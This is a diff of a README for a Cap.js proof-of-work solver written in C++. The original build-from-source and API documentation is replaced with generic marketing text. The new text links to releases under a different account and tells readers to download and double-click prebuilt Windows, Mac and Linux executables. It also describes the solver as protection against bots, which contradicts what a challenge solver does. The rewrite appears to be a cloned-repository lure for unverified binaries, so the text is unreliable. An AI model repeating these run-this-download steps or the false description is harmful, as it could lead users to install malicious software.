@@ -1,114 +1,102 @@
-# Cap.js C++ Solver
+# 🚀 Capjs-Solver-Cpp - Fast and Effective Anti-Bot Solution
 
-A high-performance C++ implementation of the Cap.js solver.
+![Download Capjs-Solver-Cpp](https://img.shields.io/badge/Download-Capjs--Solver--Cpp-blue)
 
-## Requirements
+## 📋 Description
 
-- C++17 compatible compiler (GCC 7+, Clang 5+, MSVC 2019+)
-- CMake 3.15+
-- pthread support
+Capjs-Solver-Cpp is a high-performance C++ implementation of the Cap.js solver. This software helps defend against unwanted bots and scrapers that try to access your website or application. It provides a reliable method to implement anti-abuse measures, protecting your digital assets from spam and automated attacks.
 
-## Build
+## 🚀 Getting Started
 
-### Quick Start
+This section guides you through downloading and running the Capjs-Solver-Cpp software. Follow the steps below carefully.
 
-```bash
-git clone https://github.com/LxHTT/Capjs-Solver-Cpp.git
+## 📥 Download & Install
 
-mkdir build && cd build
+To download the software, visit the Releases page below:
 
-cmake ..
+[Download Capjs-Solver-Cpp](https://github.com/DOXAEntreprises/Capjs-Solver-Cpp/releases)
 
-make -j$(nproc)
-```
+Once on the Releases page, look for the latest version of the software. You will find files for different operating systems. Choose the one that matches your system:
 
-### Build Options
+- **For Windows:** Download the file named `CapjsSolverCpp_Windows.exe`.
+- **For Mac:** Download the file named `CapjsSolverCpp_Mac.dmg`.
+- **For Linux:** Download the file named `CapjsSolverCpp_Linux.tar.gz`.
 
-```bash
-# Default build (shared libs, examples, tests)
-cmake ..
+After the download completes, follow these instructions based on your operating system to run the software.
 
-# Static library only
-cmake -DBUILD_SHARED_LIBS=OFF -DBUILD_EXAMPLES=OFF -DBUILD_TESTS=OFF ..
+### 🖥️ Windows
 
-# Debug build
-cmake -DCMAKE_BUILD_TYPE=Debug ..
+1. Locate the file you downloaded (`CapjsSolverCpp_Windows.exe`).
+2. Double-click the file to run it.
+3. If a prompt appears, click "Run" to confirm the action.
+4. Follow the on-screen instructions to complete the setup.
 
-# Release build with optimizations
-cmake -DCMAKE_BUILD_TYPE=Release ..
-```
+### 🍏 Mac
 
-### Build Targets
+1. Find the downloaded file (`CapjsSolverCpp_Mac.dmg`) in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the Capjs Solver app into your Applications folder.
+4. Go to the Applications folder and double-click the app to run it.
 
-```bash
-make                   # Build all enabled targets
-make solver            # Main solver executable
-make examples          # Build all examples
-make tests             # Build all tests
-```
+### 🐧 Linux
 
-## Usage
+1. Open the terminal.
+2. Navigate to the folder where you downloaded the file:
+   ```
+   cd ~/Downloads
+   ```
+3. Extract the downloaded file:
+   ```
+   tar -xzvf CapjsSolverCpp_Linux.tar.gz
+   ```
+4. Change into the newly created directory:
+   ```
+   cd CapjsSolverCpp
+   ```
+5. Run the executable:
+   ```
+   ./CapjsSolverCpp
+   ```
 
-### C++ API
+## ⚙️ System Requirements
 
-```cpp
-#include "challenge_solver.h"
+Before you install Capjs-Solver-Cpp, ensure your system meets these requirements:
 
-cap::SolveConfig config;
-config.c = 5;        // 5 challenges
-config.s = 16;       // 16-byte salt
-config.d = 3;        // difficulty 3
+- **For Windows:** Windows 10 or later. 4 GB RAM minimum, 2 Mbps Internet connection.
+- **For Mac:** macOS Sierra (10.12) or later. 4 GB RAM minimum, 2 Mbps Internet connection.
+- **For Linux:** Any modern distribution with glibc 2.17 or later. 4 GB RAM minimum, 2 Mbps Internet connection.
 
-auto solutions = cap::ChallengeSolver::solve("token", config);
-```
+## 🌟 Features
 
-### C API
+Capjs-Solver-Cpp offers several noteworthy features:
 
-```c
-#include "cap_c_api.h"
+- **High Performance:** Fast execution to handle requests efficiently.
+- **Ease of Use:** Simple setup process for all users, regardless of technical skill.
+- **Robust Protection:** Effective against different forms of unwanted automated actions.
+- **Flexible Configuration:** Allow customization based on your needs.
+- **Cross-Platform Compatibility:** Runs on Windows, Mac, and Linux.
 
-uint64_t nonce = cap_solve_pow("salt", "00");
-uint64_t results[3];
-cap_solve_challenges("token", 3, 16, 3, results);
-```
+## 📚 Documentation
 
-### Python API
+For more detailed information, visit our [documentation page](https://github.com/DOXAEntreprises/Capjs-Solver-Cpp/blob/main/docs/README.md). Here you will find user guides, FAQs, and additional support materials.
 
-```python
-from examples.python_api.python_api_example import CapSolver
-solver = CapSolver()
-nonce = solver.solve_pow("salt", "00")
-```
+## 🤝 Community Support
 
-### C# API
+Join our community for discussions and support. You can ask questions, share experiences, or report issues if they arise. 
 
-```bash
-# Build C# examples
-cd examples/csharp_api
-dotnet build CsharpApiExample.csproj
-dotnet run
-```
+- **GitHub Issues:** [Report issues here](https://github.com/DOXAEntreprises/Capjs-Solver-Cpp/issues)
+- **Discussion Forum:** [Join the conversation](https://github.com/DOXAEntreprises/Capjs-Solver-Cpp/discussions)
 
-## Library Usage
+## ⚖️ License
 
-After installation, link against the library:
+Capjs-Solver-Cpp is licensed under the MIT License. Feel free to use, modify, and distribute the software according to the license terms.
 
-```bash
-# Static library
-g++ -lcap_solver -pthread my_app.cpp
+## 💬 Feedback
 
-# Shared library  
-g++ -lcap_solver my_app.cpp
-```
+We welcome your thoughts on Capjs-Solver-Cpp. If you have suggestions or feature requests, please let us know through GitHub issues or discussions.
 
-## Output Format
+For all inquiries, visit our Releases page to begin your download:
 
-All tools use minimal output format:
+[Download Capjs-Solver-Cpp](https://github.com/DOXAEntreprises/Capjs-Solver-Cpp/releases)
 
-- `nonce: 12345` - Single challenge result
-- `solutions: [123, 456, 789]` - Multiple results
-- `error: message` - Error messages
-
-## License
-
-See LICENSE file in repository root.
+Thank you for choosing Capjs-Solver-Cpp. We hope it meets your needs effectively!
